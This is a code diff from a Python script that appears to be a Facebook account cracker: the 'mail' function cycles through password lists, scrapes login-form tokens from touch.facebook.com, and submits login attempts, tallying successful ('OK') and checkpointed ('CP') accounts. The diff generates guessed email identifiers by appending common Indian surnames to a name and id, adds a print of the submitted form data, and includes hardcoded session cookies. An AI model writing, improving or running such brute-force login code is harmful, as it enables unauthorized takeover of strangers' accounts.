@@ -2112,18 +2112,20 @@ def mail(uid,pwx,first,tl):
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(M1) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.write(f"\r {green}(new) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
             Session = requests.Session()
+            last = random.choice(['roy','das','sarkar','mondal'])
+            idff = first+last+uid
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
             'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
             'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
             'try_number': '0',
             'unrecognized_tries': '0',
-            'email': uid,
+            'email': idff,
             'prefill_contact_point': '',
             'prefill_source': '',
             'prefill_type': '',
@@ -2144,6 +2146,7 @@ def mail(uid,pwx,first,tl):
             'fmt': '1',
             'a': 'AYl5qTS4x2udD1YJHwF6J341XWNyHaCLSm1bD2zNXsR-pP9wT6k5jbBvwiRCA_6gqMQt81mqaSOOVhPfrcV8slR64wBsKi4kGGLR9G8ZurYJCQ',
             'user': '0'}
+            print(data)
             cookies = {
             'dpr': '2.418783187866211',
             'datr': 'F-syZzIg2LuWyDnBYPfUkTqZ',
